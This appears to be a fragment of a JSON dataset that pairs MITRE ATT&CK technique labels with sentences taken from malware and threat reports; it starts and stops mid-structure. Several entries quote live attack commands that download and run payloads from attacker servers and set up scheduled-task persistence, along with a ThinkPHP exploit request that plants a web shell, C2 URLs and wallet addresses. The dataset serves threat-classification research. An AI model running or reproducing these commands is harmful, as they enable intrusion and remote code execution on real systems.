        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " capture microphone ",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        " record audio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio",
        "Get-MicrophoneAudio"
    ],
    "process injection dll search order hijacking-multi": {
        "technique_names": [
            "process injection",
            "dll search order hijacking"
        ],
        "sentances": [
            "59 60 61 62 freeimage_32.dll freeimageplus_32.dll freeimage_64.dll freeimageplus_64.dll FreeImage open source library supports popular graphics image formats (ver 3.15.4 2012-10-27) (http://freeimage.sourceforge.net)"
        ]
    },
    "peripheral device discovery system information discovery-multi": {
        "technique_names": [
            "peripheral device discovery",
            "system information discovery"
        ],
        "sentances": [
            "69 70 rn64.dll rn32.dll Daily \u201cClientRecon\u201d (ComputerName, OS information, MacAddress, WirelessNetwork keys, connected Apple devices, Apple mobile devices backups list, IE version, SecurityCenterInfo (AV, Firewalls and AntiSpyware products), Hardware info, Installed soft including Metro Apps, Users, Autoruns)"
        ]
    },
    "execution through api application window discovery powershell-multi": {
        "technique_names": [
            "execution through api",
            "application window discovery",
            "powershell"
        ],
        "sentances": [
            "Generate payloads in various formats:      Format Architecture Short Name     Android Package x86 & ARMv7 apk   Linux Binary x86 lin_x86   Linux Binary x64 lin_x64   Linux Shared Object x86 so_x86   Linux Shared Object x64 so_x64   Windows PE Executable x86 exe_x86   Windows PE Executable x64 exe_x64   Windows DLL x86 dll_x86   Windows DLL x64 dll_x64   Python Script x86 & x64 py   PyInstaller x86 & x64 pyinst   Python Oneliner x86 & x64 py_oneliner   Powershell x86 & x64 ps1   Powershell Oneliner x86 & x64 ps1_oneliner   Ducky Script N/A rubber_ducky      Deploy in memory from a single command line using python or powershell one-liners"
        ]
    },
    "scheduled task execution through api application window discovery data staged registry run keys / startup folder-multi": {
        "technique_names": [
            "scheduled task",
            "execution through api",
            "application window discovery",
            "data staged",
            "registry run keys / startup folder"
        ],
        "sentances": [
            "Figure 2 \u2013 The entire contents of the macro \u00a0 The \u2018Company\u2019 field in this case, contains the raw command that the attacker wishes to run, downloading and executing the next stage of the malware:       cmd /c set /p=Set v=CreateObject(^\"Wscript.Shell^\"):v.Run ^\"msiexec /q /i http://199.247.6.253/ud^\",false,0 <nul >C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs & schtasks /create /sc MINUTE/tn \"Windows System\" /tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"/mo 2 /F & schtasks /create /sc MINUTE /tn \"Windows System\" /tr\"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\" /mo 2 /RU SYSTEM /c set/p=Set v=CreateObject(^\"Wscript.Shell^\"):v.Run ^\"msiexec /q /ihttp://199.247.6.253/ud^\",false,0 <nul >C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs & schtasks /create /sc MINUTE/tn \"Windows System\" /tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"/mo 2 /F & schtasks /create /sc MINUTE /tn \"Windows System\" /tr\"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\" /mo 2 /RU SYSTEM     \u00a0 Cluster B Case 2: Delivery via HTA Loader \u2013 1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458 \u00a0In this case the attackers sent an HTML Application file (.hta) to targets most likely as an email attachment"
        ]
    },
    "code signing scheduled task data from local system exploitation for client execution-multi": {
        "technique_names": [
            "code signing",
            "scheduled task",
            "data from local system",
            "exploitation for client execution"
        ],
        "sentances": [
            "An exemplar command is given below:      1234567891011121314151617  cmd /c Echo CreateObject(\"WScript.Shell\").Run \"msiexec /q /ihttp:\\\\dlj40s.jdanief[.]xyz/images/word3.doc\",0>%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs /c EchoCreateObject(\"WScript.Shell\").Run \"msiexec /q /ihttp:\\\\dlj40s.jdanief[.]xyz/images/word3.doc\",0>%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbsschtasks /create /sc MINUTE /tn \"Windows Scheduled MaintenBa\" /tr \"wscript%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\" /mo 10 /F /create /scMINUTE /tn \"Windows Scheduled MaintenBa\" /tr \"wscript%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\" /mo 10 /Fcmd /c certutil.exe -urlcache -split -fhttp:\\\\\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData\\1.pdf&startC:\\ProgramData\\1.pdf /c certutil.exe -urlcache -split -fhttp:\\\\\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData\\1.pdf&startC:\\ProgramData\\1.pdf     In the above command, the malware is downloading and executing a payload and configuring it for persistent execution"
        ]
    },
    "file and directory discovery remote file copy-multi": {
        "technique_names": [
            "file and directory discovery",
            "remote file copy",
            "tor"
        ],
        "sentances": [
            "This plugin provides the attacker with the ability to both list files and download/upload files on the victim machine",
            "10 Ensuring the files have been downloaded After the malware is downloaded and files verified, the script will check in the C:\\Program Files\\ directory for the presence Avast antivirus, which happens to be the most common installed AV worldwide",
            "Amongst the downloaded files, \u00a0the fake .gif and .jpg files appear to be dependencies for the malware"
        ]
    },
    "standard cryptographic protocol command-line interface-multi": {
        "technique_names": [
            "standard cryptographic protocol",
            "command-line interface"
        ],
        "sentances": [
            "The plugin uses the same network protocol as PLAINTEE and so we were able to trivially decode further commands that were sent.\u00a0 The following commands were observed:  tasklist ipconfig /all  The attacker performed these two commands 33 seconds apart"
        ]
    },
    "file deletion remote file copy-multi": {
        "technique_names": [
            "file deletion",
            "remote file copy"
        ],
        "sentances": [
            "Additional mitigations that could help to prevent attacks like these from succeeding in your environment include:  Changing the default handler for \u201c.hta\u201d files in your environment so that they cannot be directly executed.hta\u201d files in your environment so that they cannot be directly executed"
        ]
    },
    "custom cryptographic protocol binary padding system network configuration discovery exfiltration over alternative protocol pass the hash-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "binary padding",
            "system network configuration discovery",
            "exfiltration over alternative protocol",
            "pass the hash"
        ],
        "sentances": [
            "At least three variants of PLAINTEE have been identified to date, however, the following two samples have additional unique differences: \u00a0    Hash Functions Mutex   bcd37f1d625772c162350e5383903fe8dbed341ebf0dc38035be5078624c039e helloworld helloworld1,helloworld2,sqmAddTostream,DllEntryPoint microsoftfuckedup   6aad1408a72e7adc88c2e60631a6eee3d77f18a70e4eee868623588612efdd31    \u00a0 The following actions are performed with the additional functions:  helloworld \u2013 performs actions identical to the newer sample\u2019s \u2018Sub\u2019 function helloworld1 \u2013 accepts command-line arguments, performs a UAC bypass helloworld2 \u2013 drops and compiles a mof filemof file   sqmAddTostream \u2013 expected to run initially by the malware, checks OS version and loads the malware with helloworld2  Appendix B    Type Value Cluster   Loaders   Hash 0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855 B   Hash 1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458 B   Domain www.facebook-apps.com B   Domain dlj40s.jdanief.xyz B   IP 89.46.222.97 B   Hash a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483 A   PLAINTEE   Hash 863a9199decf36895d5d7d148ce9fd622e825f393d7ebe7591b4d37ef3f5f677 A   Hash 22a5bd54f15f33f4218454e53679d7cfae32c03ddb6ec186fb5e6f8b7f7c098b A   Hash c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d B   IP 199.247.6.253 A   IP 45.76.176.236 A   Mutex microsoftfuckedupb A   Hash 9f779d920443d50ef48d4abfa40b43f5cb2c4eb769205b973b115e04f3b978f5 A   Hash bcd37f1d625772c162350e5383903fe8dbed341ebf0dc38035be5078624c039e A   Hash 6aad1408a72e7adc88c2e60631a6eee3d77f18a70e4eee868623588612efdd31 A   Hash b099c31515947f0e86eed0c26c76805b13ca2d47ecbdb61fd07917732e38ae78 A   Domain goole.authorizeddns.us A   Mutex Microsoftfuckedup A   IP 103.75.189.74 A   IP 131.153.48.146 A   DDKONG   Hash 15f4c0a589dff62200fd7c885f1e7aa8863b8efa91e23c020de271061f4918eb A   Domain microsoft.authorizeddns.us A   IP 103.75.191.177 A   Hash 0f102e66bc2df4d14dc493ba8b93a88f6b622c168e0c2b63d0ceb7589910999d A   Hash 84607a2abfd64d61299b0313337e85dd371642e9654b12288c8a1fc7c8c1cf0a A   Hash a725abb8fe76939f0e0532978eacd7d4afb4459bb6797ec32a7a9f670778bd7e A   Hash 82e1e296403be99129aced295e1c12fbb23f871c6fa2acafab9e08d9a728cb96 A   Hash 9996e108ade2ef3911d5d38e9f3c1deb0300aa0a82d33e36d376c6927e3ee5af A   Domain www.google_ssl.onmypc.org A   Hash 18e102201409237547ab2754daa212cc1454f32c993b6e10a0297b0e6a980823 A   IP 103.75.191.75 A   Hash c78fef9ef931ffc559ea416d45dc6f43574f524ba073713fddb79e4f8ec1a319 A   Hash 01315e211bac543195f2c703033ba31b229001f844854b147c4b2a0973a7d17b A   Hash b8528c8e325db76b139d46e9f29835382a1b48d8941c47060076f367539c2559 A   Hash df14de6b43f902ac8c35ecf0582ddb33e12e682700eb55dc4706b73f5aed40f6 A   Hash 177906cb9170adc26082e44d9ad1b3fbdcba7c0b57e28b614c1b66cc4a99f906 A   Hash 113ae6f4d6a2963d5c9a7f42f782b176da096d17296f5a546433f7f27f260895 A   Domain ftp.chinhphu.ddns.ms A   Hash 128adaba3e6251d1af305a85ebfaafb2a8028eed3b9b031c54176ca7cef539d2 A   Domain www.microsoft.https443.org A   IP 45.121.146.26 A   Hash 5afbee76af2a09c173cf782fd5e51b5076b87f19b709577ddae1c8e5455fc642 A   Domain msdns.otzo.com A   Hash 119572fafe502907e1d036cdf76f62b0308b2676ebdfc3a51dbab614d92bc7d0 A   Domain goole.authorizeddns.us A   IP 103.75.189.74 A"
        ]
    },
    "system network configuration discovery brute force-multi": {
        "technique_names": [
            "system network configuration discovery",
            "brute force"
        ],
        "sentances": [
            "The threat actor can now combine the information and brute force their way throughout the network (through NetBIOS) using a list of usernames and passwords as well as a range of IP addresses"
        ]
    },
    "execution through api application window discovery remote file copy windows admin shares-multi": {
        "technique_names": [
            "execution through api",
            "application window discovery",
            "remote file copy",
            "windows admin shares"
        ],
        "sentances": [
            "Features  TCP network stream (IPv4 & IPv6 support) Fast network serialization (Protocol Buffers) Compressed (QuickLZ) & Encrypted (TLS) communication Multi-Threaded UPnP Support No-Ip.com Support Visit Website (hidden & visible) Show Messagebox Task Manager File Manager Startup Manager Remote Desktop Remote Shell Download & Execute Upload & Execute System Information Computer Commands (Restart, Shutdown, Standby) Keylogger (Unicode Support) Reverse Proxy (SOCKS5) Password Recovery (Common Browsers and FTP Clients) Registry Editor  Supported runtimes and operating systems  .NET Framework 4.0 Client Profile or higher (Download) Supported operating systems (32- and 64-bit)  Windows XP SP3 Windows Server 2003 Windows Vista Windows Server 2008 Windows 7 Windows Server 2012 Windows 8/8.1 Windows 10    Compiling Open the project in Visual Studio 2017+ and restore the NuGET packages"
        ]
    },
    "file deletion scripting-multi": {
        "technique_names": [
            "file deletion",
            "scripting"
        ],
        "sentances": [
            "The White Atlas framework often utilized a small Javascript script to execute the malware dropper payload after it was decrypted by the VBA macro code, then to delete the dropper afterwards",
            "Finally, the malware executes the extracted install.bat script before deleting the original files and exiting"
        ]
    },
    "file deletion scripting obfuscated files or information-multi": {
        "technique_names": [
            "file deletion",
            "scripting",
            "obfuscated files or information"
        ],
        "sentances": [
            "A much more advanced and highly obfuscated Javascript script was utilized in White Atlas samples that dropped a Firefox extension backdoor developed by Turla, but again the script was responsible for the simple tasks of writing out the extension.json configuration file for the extension and deleting itself for cleanup purposes"
        ]
    },
    "account discovery launch agent-multi": {
        "technique_names": [
            "account discovery",
            "launch agent"
        ],
        "sentances": [
            "However, we were able determine a unique, hard-coded user agent used for the C2 communications: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1) Using AutoFocus, we pivoted from the user agent string to expand our data set to three additional Zebrocy samples using the exact same user agent"
        ]
    },
    "system owner/user discovery launch agent-multi": {
        "technique_names": [
            "system owner/user discovery",
            "launch agent"
        ],
        "sentances": [
            "One sample in particular, cba5ab65a\u2026 used yet another unique user agent string in combination with the previous user agent for its C2: Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1 A malware sample using two separate unique user agent strings is uncommon",
            "Examining the use of the unique user agents\u2019 strings over time shows that while previously only the Mozilla/5.0 user agent was in use, since mid 2017 all three user agent strings have been used by the Zebrocy tool for its C2 communications"
        ]
    },
    "masquerading remote file copy-multi": {
        "technique_names": [
            "masquerading",
            "remote file copy"
        ],
        "sentances": [
            "The DDE instructions attempt to run the following the following command on the victim host, which attempts to download and execute a payload from a remote server:       C:\\\\Programs\\\\Microsoft\\\\MSOffice\\\\Word.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\rundll32.exeC:\\\\Windows\\\\System32\\\\shell32.dll,ShellExec_RunDLLC:\\\\Windows\\\\System32\\\\cmd.exe /k certutil -urlcache -split -fhxxp://220.158.216[.]127/MScertificate.exe & MScertificate.exe\"     During our analysis, we observed this DDE downloading and executing a Zebrocy AutoIt downloader (f27836430\u2026), configured to attempt to download an additional payload from 220.158.216[.]127"
        ]
    },
    "standard application layer protocol deobfuscate/decode files or information fallback channels-multi": {
        "technique_names": [
            "standard application layer protocol",
            "deobfuscate/decode files or information",
            "fallback channels"
        ],
        "sentances": [
            "For instance, here are the resulting decrypted strings from each of the case statements (dd7e69e1\u2026): Case \u2013 String decrypted 1 \u2013 185.25.50[.]93 2 \u2013 POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1\\r\\nHost: 185.25.50[.]93\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 3 \u2013 porg= 4 \u2013 Content-Length: The Trojan uses raw sockets to communicate with its C2 server and uses the decrypted string above to create HTTP requests"
        ]
    },
    "execution through api deobfuscate/decode files or information-multi": {
        "technique_names": [
            "execution through api",
            "deobfuscate/decode files or information"
        ],
        "sentances": [
            "The Trojan will convert these hexadecimal bytes to their binary values and write them to a file and will run the file using the \u201copen\u201d function using the ShellExecuteW API function",
            "The payload then sets EIP to the entry point of the newly injected code using the SetThreadContext API, and finally calls the NtAlertResumeThread API function to run the injected code"
        ]
    },
    "masquerading scripting data encrypted-multi": {
        "technique_names": [
            "masquerading",
            "scripting",
            "data encrypted"
        ],
        "sentances": [
            "For instance, the following data exists within a resource: fb 70 b0 c9 bd c5 8a d4 0c 54 fd 4c 6d bb f0 0f By multiplying each byte with -1, we obtain the following data: 05 90 50 37 43 3b 76 2c f4 ac 03 b4 93 45 10 f1 After using RC4 and the key 14331d289e737093994395d3fc412afc, the following cleartext data appears: \\x00\\x00\\x00\\x00FlashRun.vbs We do not see the payload using this FlashRun.vbs filename, instead it uses a temporary file name to store an embedded VBScript file, such as %Temp%\\4.tmp\\5.vbs"
        ]
    },
    "command-line interface exploitation for client execution-multi": {
        "technique_names": [
            "command-line interface",
            "exploitation for client execution"
        ],
        "sentances": [
            "The exploitation is issued in three steps:  Exploiting CVE-2018-20062 for uploading a PHP shell  Using a GET request, a remote command execution vulnerability in ThinkPHP (CVE-2018-20062) is sent to the targeted server, as shown below: s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<? php $action = $_GET[\u2018module\u2019];system($action);? ^>>index.php This shell executes commands sent via the \u201cmodule\u201d parameter in a query"
        ]
    },
    "exploitation for client execution remote file copy-multi": {
        "technique_names": [
            "exploitation for client execution",
            "remote file copy"
        ],
        "sentances": [
            "f) Hadoop YARN ResourceManager \u2013 Command Execution (exploit) g) CVE-2016-3088: Apache ActiveMQ Fileserver File Upload Remote Code Execution Vulnerability"
        ]
    },
    "screen capture obfuscated files or information-multi": {
        "technique_names": [
            "screen capture",
            "obfuscated files or information"
        ],
        "sentances": [
            "Figures 8 and 9: LiteHTTP screenshots taken from the user`s profile in which the acronym \u201cKnock\u201d appears Conclusion SpeakUp`s obfuscated payloads and propagation technique is beyond any doubt the work of a bigger threat in the making"
        ]
    },
    "execution through api deobfuscate/decode files or information command-line interface scripting exploitation for client execution remote file copy service execution-multi": {
        "technique_names": [
            "execution through api",
            "deobfuscate/decode files or information",
            "command-line interface",
            "scripting",
            "exploitation for client execution",
            "remote file copy",
            "service execution"
        ],
        "sentances": [
            "The Check Point IPS blade provides protections against these threats:  Command Injection Over HTTP NoneCMS ThinkPHP Remote Code Execution (CVE-2018-20062) Oracle WebLogic WLS Security Component Remote Code Execution (CVE-2017-10271) Oracle WebLogic WLS Server Component Arbitrary File Upload(CVE-2018-2894) Hadoop YARN ResourceManager Remote Command Execution Apache ActiveMQ Fileserver Multi Methods Directory Traversal(CVE-2016-3088) JBoss Seam 2 Framework Remote Code Execution (CVE-2010-1871) JBoss Enterprise Application Platform Invoker Servlets Remote Code Execution (CVE-2012-0874) Red Hat JBoss AS Remote Code Execution Suspicious Linux Shell Downloader  The Check Point Anti-Bot blade provides protections against this threat:  Linux.SpeakUp  IOCs Md5: SpeakUp Scripts:     0a4e5831a2d3115acb3e989f0f660a6f   0b5e1eb67be7c3020610b321f68375c1   968d1906be7eb8321a3afac5fde77467   074d7a4417d55334952d264c0345d885   f357f32d7c2ddfef4b5850e7506c532b   b6311bffcea117dceac5ccac0a243ae5   2adf4e4512aaafab75e8411aa7121ffa   a73c7b777d31b0a8ef270809e2ed6510   114cda60d215e44baeef22b7db0c64d5   8f725fc5406ebf679c5c7ade3e8d5f70   4a80a075c7c6b5e738a7f4b60b7b101f   e18749e404baec2aa29f4af001164d1b   1a377b5d5d2162327f0706cc84427780   1da94e156609d7e880c413a124bad004   713260a53eff05ad44aad8d6899f1c6e   36cda3c77ba380d6388a01aafcbaa6c7   0f83482368343f5c811bac84a395d2c0   8dd6cb5f33d25512805c70bd3db5f433   e4ca1e857034cbe0428d431c15ec8608   36502273cee61825dc97d62a3dffe729   f16c5a6342ccc253b1de177d3fa310b1   08d7674532cc226931570e6a99d5ba30   279c4aa955085480f3ad0c19aa36a93b    XMRig Miners: f79be3df4cbfe81028040796733ab07f a21a3d782d30b51515834a7bf68adc8e c572a10ca12f3bd9783c6d576aa080fb b60ec230644b740ca4dd6fd45059a4be 5e6b6fcd7913ae4917b0cdb0f09bf539 ae875c496535be196449547a15205883 068d424a1db93ec0c1f90f5e501449a3 996e0c8190880c8bf1b8ffb0826cf30f C&Cs:    67[.]209.177.163   173[.]82.104.196   5[.]196.70.86   120[.]79.247.183   5[.]2.73.127/lnsqqFE2jK/pprtnp153WWW.php   Speakupomaha[.]com/misc/ui/images/Indxe.php   Linuxservers[.]000webhostapp[.]com/hp.html   linuxsrv134[.]xp3[.]biz    Monero Wallets: 47UW2Qv7AB4CsD8L5WWSvx58ztrzHhcMeYN7AJry9aMZhGDLXGwBHLv8LpaDUxpmdWfqbbfrqpdieQAeVSMCU1qY4BFABPY 4Aa3TcU7ixMVcYwbsw8ENVbFwt4ZuqrNBVij5TRvPCTpGRK5BKBHQPu7ahT7z2A6547a5Lcn7yPZV1xU22ZbviqxUX7JVuP 4An3Radh69LgcTHJf1U3awa9ffej4b6DcUmEv8wirsDm8zRMSjifrwybH2AzHdEsW8eew3rFtk4QbGJMxqitfxmZJhABxpT"
        ]
    },
    "peripheral device discovery account discovery-multi": {
        "technique_names": [
            "peripheral device discovery",
            "account discovery"
        ],
        "sentances": [
            "Watch on\u00a0Fox News: Hackers may use fake Netflix app to spy on\u00a0users As users have become more attached to their mobile devices, they want everything on those devices"
        ]
    },
    "screen capture file and directory discovery commonly used port-multi": {
        "technique_names": [
            "screen capture",
            "file and directory discovery",
            "commonly used port",
            "tor"
        ],
        "sentances": [
            "SpyNote RAT is capable of performing a variety of alarming functions that\u00a0includes:   Activating the device\u2019s microphone and listening to live\u00a0conversations  Executing commands on the\u00a0device  Copying files from the device to a Command & Control (C&C)\u00a0center  Recording screen\u00a0captures  Viewing\u00a0contacts  Reading SMS\u00a0messages  The screenshot below shows part of the sandbox\u2019s report on the SpyNote RAT\u2019s signature and detected\u00a0functions:          Figure 1 :\u00a0Zscaler Cloud Sandbox\u00a0Detection     The fake Netflix app we are analyzing in this blog appears to be built using an updated version of SpyNote RAT builder, which was\u00a0leaked last\u00a0year"
        ]
    },
    "screen capture command-line interface-multi": {
        "technique_names": [
            "screen capture",
            "command-line interface"
        ],
        "sentances": [
            "The following screenshot shows the command execution functionality in action: \u00a0          Figure 4:\u00a0Command\u00a0Execution     The\u00a0paramString\u00a0parameter shown in the above screenshot\u00a0can be any command received from C&C"
        ]
    },
    "account discovery network service scanning-multi": {
        "technique_names": [
            "account discovery",
            "network service scanning"
        ],
        "sentances": [
            "It can be used to execute files as a different user, move, and delete files locally, schedule remote AT jobs, perform host discovery on connected networks, scan for open ports on hosts in a connected network, and retrieve information about the OS, users, groups, and shares on remote hosts"
        ]
    },
    "input capture remote file copy-multi": {
        "technique_names": [
            "input capture",
            "remote file copy"
        ],
        "sentances": [
            "This is a classic RAT that can download, upload, execute commands on the victim host and, finally, perform keylogging"
        ]
    },
    "data staged remote file copy-multi": {
        "technique_names": [
            "data staged",
            "remote file copy"
        ],
        "sentances": [
            "Interestingly, the attacker has used the >> method to append to the file so there can be multiple outputs written to their single TMP file: \"C:\\Windows\\system32\\cmd.exe\" /C systeminfo >> \"C:\\Ahnlab\\$$$A24F.TMP\"  \"C:\\WINDOWS\\system32\\cmd.exe\" /C tasklist /v >> \"C:\\Ahnlab\\$$$A24F.TMP\"   NavRAT   Capabilities  NavRAT is a remote access trojan (RAT) designed to upload, download and execute files"
        ]
    },
    "file and directory discovery data staged remote file copy-multi": {
        "technique_names": [
            "file and directory discovery",
            "data staged",
            "remote file copy",
            "tor"
        ],
        "sentances": [
            "The log files mentioned previously are stored in the same directory as NavRAT on the victim machine, again making it easy for us to find and analyse the additional log files"
        ]
    },
    "masquerading video capture-multi": {
        "technique_names": [
            "masquerading",
            "video capture"
        ],
        "sentances": [
            "68271df868f462c06e24a896a9494225,Office Monkeys LOL Video.zip Believe it or not, recipients in bulk run the file within: 95b3ec0a4e539efaa1faa3d4e25d51de,Office Monkeys (Short Flash Movie).exe This file in turn drops two executables to %temp%: 2aabd78ef11926d7b562fd0d91e68ad3, Monkeys.exe 3d3363598f87c78826c859077606e514, player.exe It first launches Monkeys.exe, playing a self-contained, very funny video of white-collar tie wearing chimpanzees working in a high rise office with a human colleague"
        ]
    },
    "security software discovery masquerading-multi": {
        "technique_names": [
            "security software discovery",
            "masquerading"
        ],
        "sentances": [
            "It then launches player.exe, a CozyDuke dropper maintaining anti-detection techniques: 3d3363598f87c78826c859077606e514,player.exe,338kb,Trojan.Win32.CozyBear.v,CompiledOn:2014.07.02 21:13:33 Anti-detection and trojan functionality The file collects system information, and then invokes a WMI instance in the root\\securitycenter namespace to identify security products installed on the system, meaning that this code was built for x86 systems, wql here: SELECT * FROM AntiVirusProduct SELECT * FROM FireWallProduct The code hunts for several security products to evade: CRYSTAL KASPERSKY SOPHOS DrWeb AVIRA COMODO Dragon In addition to the WMI/wql use, it also hunts through the \u201cSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\\u201d registry key looking for security products to avoid"
        ]
    },
    "code signing file and directory discovery-multi": {
        "technique_names": [
            "code signing",
            "file and directory discovery",
            "tor"
        ],
        "sentances": [
            "Following these checks, it drops several more malware files signed with the pasted AMD digital signature to a directory it creates"
        ]
    },
    "code signing obfuscated files or information-multi": {
        "technique_names": [
            "code signing",
            "obfuscated files or information"
        ],
        "sentances": [
            "Executable-Signing Certificates Samples are usually signed with a fake certificate \u2013 we\u2019ve seen two instances, one AMD and one Intel:  Configuration files: Some of the malware uses an encrypted configuration file which is stored on disk as \u201cracss.dat\u201d"
        ]
    },
    "process injection rundll32-multi": {
        "technique_names": [
            "process injection",
            "rundll32"
        ],
        "sentances": [
            "ChromeUpdate.exe starts the file with \u201crundll32 cache.dll,ADB_Setup\u201d Cache.dll analysis  Cache.dll was written in C/C++ and built with a Microsoft compiler"
        ]
    },
    "data from local system deobfuscate/decode files or information exfiltration over command and control channel-multi": {
        "technique_names": [
            "data from local system",
            "deobfuscate/decode files or information",
            "exfiltration over command and control channel"
        ],
        "sentances": [
            "Cache.dll code flow overview RC4 decrypt hardcoded c2 and urls resolve hidden function calls collect identifying victim system data encrypt collected data send stolen data to c2 and retrieve commands Cache.dll code details Structurally, \u201cCache.dll\u201d is a fairly large backdoor at 425KB"
        ]
    },
    "execution through api deobfuscate/decode files or information system network configuration discovery-multi": {
        "technique_names": [
            "execution through api",
            "deobfuscate/decode files or information",
            "system network configuration discovery"
        ],
        "sentances": [
            "The code then decodes this set of import symbols and resolves addresses for its networking and data stealing functionality: InternetCloseHandle InternetReadFile HttpSendRequestA HttpOpenRequestA HttpQueryInfoA InternetConnectA InternetCrackUrlA InternetOpenA InternetSetOptionW GetAdaptersInfo Much like the prior office monkey \u201catiumdag.dll\u201d component, this code collects identifying system information using standard win32 API calls: Computer name \u2013 GetComputerNameW User name \u2013 GetUserNameW Adapter GUID, ip address, mac address \u2013 GetAdaptersInfo Windows version \u2013 GetVersionExW It then uses the runtime resolved networking API calls to send the collected data back to a hardcoded c2 and set of urls"
        ]
    },
    "execution through api account discovery-multi": {
        "technique_names": [
            "execution through api",
            "account discovery"
        ],
        "sentances": [
            "Cache.dll connectback urls: 209.200.83.43/ajax/links.php 209.200.83.43/ajax/api.php 209.200.83.43/ajax/index.php 209.200.83.43/ajax/error.php 209.200.83.43/ajax/profile.php 209.200.83.43/ajax/online.php 209.200.83.43/ajax/loader.php 209.200.83.43/ajax/search.php Observed user-agent string on the wire, but it\u2019s dynamically generated based on the Windows system settings (retrieved using standard win32 api \u201cObtainUserAgentString\u201d): \u201cUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)\u201d Communications with the CozyDuke C2 include key/value pairs passed as URL parameters"
        ]
    },
    "spearphishing link security software discovery file and directory discovery exfiltration over alternative protocol brute force commonly used port-multi": {
        "technique_names": [
            "spearphishing link",
            "security software discovery",
            "file and directory discovery",
            "exfiltration over alternative protocol",
            "brute force",
            "commonly used port",
            "arp",
            "tor"
        ],
        "sentances": [
